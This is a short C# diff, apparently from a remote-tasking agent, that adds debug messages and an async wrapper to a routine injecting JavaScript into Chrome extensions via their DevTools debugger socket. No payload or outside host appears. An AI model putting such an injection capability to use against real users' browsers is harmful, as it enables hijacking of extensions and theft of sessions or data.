@@ -72,8 +72,20 @@ namespace Agent
         }
         internal bool TryInjectJs(ChromeJsonObject extension, string jsCode, string task_id, out string response)
         {
+            if (this.config.debug)
+            {
+                ReturnOutput("Injectin.", task_id).RunSynchronously();
+            }
             response = InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl), task_id).Result;
+            if (this.config.debug)
+            {
+                ReturnOutput("Done." + response, task_id).RunSynchronously();
+            }
             return true;
+        }
+        internal async Task<string> TryInjectJsAsync(ChromeJsonObject extension, string jsCode, string task_id)
+        {
+            return await InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl), task_id);
         }
         internal async Task<string> InjectJs(string jsCode, Uri uri, string task_id)
         {
